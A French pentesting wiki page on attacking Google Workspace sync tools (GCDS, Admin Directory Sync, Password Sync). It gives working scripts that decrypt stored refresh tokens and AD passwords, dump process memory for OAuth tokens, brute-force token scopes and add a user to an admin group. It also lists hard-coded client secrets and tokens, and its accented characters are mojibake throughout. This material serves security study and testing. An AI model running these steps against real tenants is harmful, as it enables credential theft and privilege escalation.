https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Quelques exemples utilisant certains de ces scopes :

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** est un module compl√©mentaire pour Google Workspace qui fournit des outils pour la conservation des donn√©es, la recherche et l'exportation des donn√©es de votre organisation stock√©es dans les services Google Workspace tels que Gmail, Drive, Chat, et plus encore.

* Un **Matter** dans Google Workspace Vault est un **conteneur** qui organise et regroupe toutes les informations li√©es √† un cas, une enqu√™te ou une affaire l√©gale sp√©cifique. Il sert de point central pour g√©rer les **Holds**, **Searches**, et **Exports** concernant ce probl√®me particulier.
* Un **Hold** dans Google Workspace Vault est une **action de pr√©servation** appliqu√©e √† des utilisateurs ou groupes sp√©cifiques pour **emp√™cher la suppression ou la modification** de leurs donn√©es au sein des services Google Workspace. Les Holds garantissent que les informations pertinentes restent intactes et non modifi√©es pendant la dur√©e d'une affaire l√©gale ou d'une enqu√™te.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
More [API endpoints in the docs](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

C'est un outil qui peut √™tre utilis√© pour **synchroniser vos utilisateurs et groupes d'annuaire actif avec votre Workspace** (et non l'inverse au moment de la r√©daction).

C'est int√©ressant car c'est un outil qui n√©cessitera les **identifiants d'un super utilisateur Workspace et d'un utilisateur AD privil√©gi√©**. Il pourrait donc √™tre possible de le trouver √† l'int√©rieur d'un serveur de domaine qui synchroniserait des utilisateurs de temps en temps.

{% hint style="info" %}
Pour effectuer un **MitM** sur le binaire **`config-manager.exe`**, ajoutez simplement la ligne suivante dans le fichier `config.manager.vmoptions` : **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
Notez que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) est capable de d√©tecter **GCDS**, d'obtenir des informations sur la configuration et **m√™me les mots de passe et les identifiants chiffr√©s**.
{% endhint %}

Notez √©galement que GCDS ne synchronisera pas les mots de passe d'AD vers Workspace. Si quelque chose, il g√©n√©rera simplement des mots de passe al√©atoires pour les nouveaux utilisateurs cr√©√©s dans Workspace comme vous pouvez le voir dans l'image suivante :

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Jetons de disque & Identifiants AD

Le binaire `config-manager.exe` (le binaire principal de GCDS avec interface graphique) stockera par d√©faut les identifiants d'annuaire actif configur√©s, le jeton de rafra√Æchissement et l'acc√®s dans un **fichier xml** dans le dossier **`C:\Program Files\Google Cloud Directory Sync`** dans un fichier appel√© **`Untitled-1.xml`** par d√©faut. Bien qu'il puisse √©galement √™tre enregistr√© dans les `Documents` de l'utilisateur ou dans **n'importe quel autre dossier**.

De plus, le registre **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** √† l'int√©rieur de la cl√© **`open.recent`** contient les chemins vers tous les fichiers de configuration r√©cemment ouverts (xmls). Il est donc possible de **v√©rifier cela pour les trouver**.

Les informations les plus int√©ressantes √† l'int√©rieur du fichier seraient :
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
Notez comment le **refresh** **token** et le **password** de l'utilisateur sont **encrypt√©s** en utilisant **AES CBC** avec une cl√© et un IV g√©n√©r√©s al√©atoirement stock√©s dans **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** (o√π la biblioth√®que Java **`prefs`** stocke les pr√©f√©rences) dans les cl√©s de cha√Æne **`/Encryption/Policy/V2.iv`** et **`/Encryption/Policy/V2.key`** stock√©es en base64.

<details>

<summary>Script Powershell pour d√©chiffrer le refresh token et le password</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
Notez qu'il est possible de v√©rifier cette information en consultant le code java de **`DirSync.jar`** dans **`C:\Program Files\Google Cloud Directory Sync`** en recherchant la cha√Æne `exportkeys` (car c'est le param√®tre cli que le binaire `upgrade-config.exe` s'attend √† utiliser pour extraire les cl√©s).
{% endhint %}

Au lieu d'utiliser le script powershell, il est √©galement possible d'utiliser le binaire **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** avec le param√®tre `-exportKeys` et d'obtenir la **Key** et l'**IV** depuis le registre en hexad√©cimal, puis d'utiliser CyberChef avec AES/CBC et cette cl√© et IV pour d√©chiffrer les informations.

### GCDS - Extraction de jetons de la m√©moire

Tout comme avec GCPW, il est possible d'extraire la m√©moire du processus `config-manager.exe` (c'est le nom du binaire principal de GCDS avec interface graphique) et vous pourrez trouver des jetons d'actualisation et d'acc√®s (s'ils ont d√©j√† √©t√© g√©n√©r√©s).\
Je suppose que vous pourriez √©galement trouver les identifiants configur√©s pour AD.

<details>

<summary>Extraire les processus config-manager.exe et rechercher des jetons</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - G√©n√©ration de jetons d'acc√®s √† partir de jetons d'actualisation

En utilisant le jeton d'actualisation, il est possible de g√©n√©rer des jetons d'acc√®s en utilisant celui-ci ainsi que l'ID client et le secret client sp√©cifi√©s dans la commande suivante :
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
Notez qu'il n'est pas possible de demander n'importe quel scope pour le token d'acc√®s, m√™me en ayant un token de rafra√Æchissement, car vous ne pouvez demander que les **scopes pris en charge par l'application o√π vous g√©n√©rez le token d'acc√®s**.

De plus, le token de rafra√Æchissement n'est pas valide dans toutes les applications.
{% endhint %}

Par d√©faut, GCSD n'aura pas acc√®s en tant qu'utilisateur √† tous les scopes OAuth possibles, donc en utilisant le script suivant, nous pouvons trouver les scopes qui peuvent √™tre utilis√©s avec le `refresh_token` pour g√©n√©rer un `access_token` :

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Et voici le r√©sultat que j'ai obtenu au moment de l'√©criture :
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### Cr√©ez un utilisateur et ajoutez-le au groupe `gcp-organization-admins` pour essayer d'escalader dans GCP
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
Il n'est pas possible de donner au nouvel utilisateur le r√¥le de Super Admin car le **jeton d'actualisation n'a pas suffisamment de port√©es** pour donner les privil√®ges requis.
{% endhint %}

## Synchronisation de l'annuaire Admin

La principale diff√©rence entre cette m√©thode de synchronisation des utilisateurs avec GCDS est que GCDS se fait manuellement avec des binaires que vous devez t√©l√©charger et ex√©cuter, tandis que **la synchronisation de l'annuaire Admin est sans serveur** g√©r√©e par Google √† [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

Au moment de la r√©daction de ce document, ce service est en version b√™ta et prend en charge 2 types de synchronisation : depuis **Active Directory** et depuis **Azure Entra ID :**

* **Active Directory :** Pour configurer cela, vous devez donner **acc√®s √† Google √† votre environnement Active Directory**. Et comme Google n'a acc√®s qu'aux r√©seaux GCP (via **les connecteurs VPC**), vous devez cr√©er un connecteur et ensuite rendre votre AD disponible depuis ce connecteur en l'ayant dans des VM sur le r√©seau GCP ou en utilisant Cloud VPN ou Cloud Interconnect. Ensuite, vous devez √©galement fournir **des identifiants** d'un compte avec un acc√®s en lecture sur l'annuaire et un **certificat** pour contacter via **LDAPS**.
* **Azure Entra ID :** Pour configurer cela, il suffit de **se connecter √† Azure avec un utilisateur ayant un acc√®s en lecture** sur l'abonnement Entra ID dans une fen√™tre contextuelle affich√©e par Google, et Google conservera le jeton avec un acc√®s en lecture sur Entra ID.

Une fois correctement configur√©es, les deux options permettront de **synchroniser les utilisateurs et les groupes vers Workspace**, mais elles ne permettront pas de configurer les utilisateurs et les groupes de Workspace vers AD ou EntraID.

D'autres options qui seront autoris√©es lors de cette synchronisation sont :

* Envoyer un e-mail aux nouveaux utilisateurs pour se connecter
* Changer automatiquement leur adresse e-mail pour celle utilis√©e par Workspace. Donc, si Workspace utilise `@hacktricks.xyz` et que les utilisateurs EntraID utilisent `@carloshacktricks.onmicrosoft.com`, `@hacktricks.xyz` sera utilis√© pour les utilisateurs cr√©√©s dans le compte.
* S√©lectionner les **groupes contenant les utilisateurs** qui seront synchronis√©s.
* S√©lectionner les **groupes** √† synchroniser et √† cr√©er dans Workspace (ou indiquer de synchroniser tous les groupes).

### De AD/EntraID -> Google Workspace (& GCP)

Si vous parvenez √† compromettre un AD ou EntraID, vous aurez un contr√¥le total sur les utilisateurs et les groupes qui vont √™tre synchronis√©s avec Google Workspace.\
Cependant, notez que les **mots de passe** que les utilisateurs pourraient utiliser dans Workspace **pourraient √™tre les m√™mes ou non**.

#### Attaquer les utilisateurs

Lorsque la synchronisation se produit, elle peut synchroniser **tous les utilisateurs de l'AD ou seulement ceux d'une OU sp√©cifique** ou seulement les **utilisateurs membres de groupes sp√©cifiques dans EntraID**. Cela signifie que pour attaquer un utilisateur synchronis√© (ou en cr√©er un nouveau qui sera synchronis√©), vous devrez d'abord d√©terminer quels utilisateurs sont synchronis√©s.

* Les utilisateurs peuvent **r√©utiliser le mot de passe ou non de l'AD ou d'EntraID**, mais cela signifie que vous devrez **compromettre les mots de passe des utilisateurs pour vous connecter**.
* Si vous avez acc√®s aux **e-mails** des utilisateurs, vous pourriez **changer le mot de passe Workspace d'un utilisateur existant**, ou **cr√©er un nouvel utilisateur**, attendre qu'il soit synchronis√© et configurer le compte.

Une fois que vous acc√©dez √† l'utilisateur dans Workspace, il pourrait se voir attribuer certaines **permissions par d√©faut**.

#### Attaquer les groupes

Vous devez √©galement d'abord d√©terminer quels groupes sont synchronis√©s. Bien qu'il existe la possibilit√© que **TOUS** les groupes soient synchronis√©s (car Workspace le permet).

{% hint style="info" %}
Notez que m√™me si les groupes et les adh√©sions sont import√©s dans Workspace, les **utilisateurs qui ne sont pas synchronis√©s dans la synchronisation des utilisateurs ne seront pas cr√©√©s** lors de la synchronisation des groupes, m√™me s'ils sont membres de l'un des groupes synchronis√©s.
{% endhint %}

Si vous savez quels groupes d'Azure se voient **attribuer des permissions dans Workspace ou GCP**, vous pourriez simplement ajouter un utilisateur compromis (ou nouvellement cr√©√©) dans ce groupe et obtenir ces permissions.

Il existe une autre option pour abuser des groupes privil√©gi√©s existants dans Workspace. Par exemple, le groupe `gcp-organization-admins@<workspace.email>` a g√©n√©ralement des privil√®ges √©lev√©s sur GCP.

Si la synchronisation de, par exemple, EntraID vers Workspace est **configur√©e pour remplacer le domaine** de l'objet import√© **par l'e-mail de Workspace**, il sera possible pour un attaquant de cr√©er le groupe `gcp-organization-admins@<entraid.email>` dans EntraID, d'ajouter un utilisateur dans ce groupe et d'attendre que la synchronisation de tous les groupes se produise.\
**L'utilisateur sera ajout√© dans le groupe `gcp-organization-admins@<workspace.email>` augmentant ainsi les privil√®ges dans GCP.**

### De Google Workspace -> AD/EntraID

Notez que Workspace n√©cessite des identifiants avec un acc√®s en lecture seule sur AD ou EntraID pour synchroniser les utilisateurs et les groupes. Par cons√©quent, il n'est pas possible d'abuser de Google Workspace pour effectuer des modifications dans AD ou EntraID. Donc, **ce n'est pas possible** √† ce moment.

Je ne sais √©galement pas o√π Google stocke les identifiants AD ou le jeton EntraID et vous **ne pouvez pas les r√©cup√©rer en reconfigurant la synchronisation** (ils n'apparaissent pas dans le formulaire web, vous devez les fournir √† nouveau). Cependant, depuis le web, il pourrait √™tre possible d'abuser de la fonctionnalit√© actuelle pour **lister les utilisateurs et les groupes**.

## GPS - Google Password Sync

C'est le binaire et le service que Google propose pour **maintenir synchronis√©s les mots de passe des utilisateurs entre l'AD** et Workspace. Chaque fois qu'un utilisateur change son mot de passe dans l'AD, il est d√©fini sur Google.

Il est install√© dans `C:\Program Files\Google\Password Sync` o√π vous pouvez trouver le binaire `PasswordSync.exe` pour le configurer et `password_sync_service.exe` (le service qui continuera √† fonctionner).

### GPS - Configuration

Pour configurer ce binaire (et service), il est n√©cessaire de **lui donner acc√®s √† un principal Super Admin dans Workspace** :

* Se connecter via **OAuth** avec Google et ensuite il **stockera un jeton dans le registre (chiffr√©)**
* Disponible uniquement sur les contr√¥leurs de domaine avec interface graphique
* Fournir des **identifiants de compte de service de GCP** (fichier json) avec des permissions pour **g√©rer les utilisateurs de Workspace**
* Tr√®s mauvaise id√©e car ces identifiants n'expirent jamais et pourraient √™tre mal utilis√©s
* Tr√®s mauvaise id√©e de donner un acc√®s SA sur Workspace car le SA pourrait √™tre compromis dans GCP et il serait possible de pivoter vers Workspace
* Google l'exige pour les contr√¥leurs de domaine sans interface graphique
* Ces identifiants sont √©galement stock√©s dans le registre

Concernant l'AD, il est possible d'indiquer d'utiliser le **contexte d'application actuel, anonyme ou des identifiants sp√©cifiques**. Si l'option d'identifiants est s√©lectionn√©e, le **nom d'utilisateur** est stock√© dans un fichier sur le **disque** et le **mot de passe** est **chiffr√©** et stock√© dans le **registre**.

### GPS - Dumping du mot de passe et du jeton depuis le disque

{% hint style="success" %}
Notez que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) est capable de d√©tecter **GPS**, d'obtenir des informations sur la configuration et **m√™me de d√©chiffrer le mot de passe et le jeton**.
{% endhint %}

Dans le fichier **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`**, il est possible de trouver une partie de la configuration comme le **`baseDN`** de l'AD configur√© et le **`nom d'utilisateur`** dont les identifiants sont utilis√©s.

Dans le registre **`HKLM\Software\Google\Google Apps Password Sync`**, il est possible de trouver le **jeton d'actualisation chiffr√©** et le **mot de passe chiffr√©** pour l'utilisateur AD (le cas √©ch√©ant). De plus, si au lieu d'un jeton, des **identifiants SA** sont utilis√©s, il est √©galement possible de les trouver chiffr√©s √† cette adresse de registre. Les **valeurs** √† l'int√©rieur de ce registre ne sont **accessibles** que par les **Administrateurs**.

Le **mot de passe** chiffr√© (le cas √©ch√©ant) se trouve dans la cl√© **`ADPassword`** et est chiffr√© √† l'aide de l'API **`CryptProtectData`**. Pour le d√©chiffrer, vous devez √™tre le m√™me utilisateur que celui qui a configur√© la synchronisation des mots de passe et utiliser cette **entropie** lors de l'utilisation de **`CryptUnprotectData`** : `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

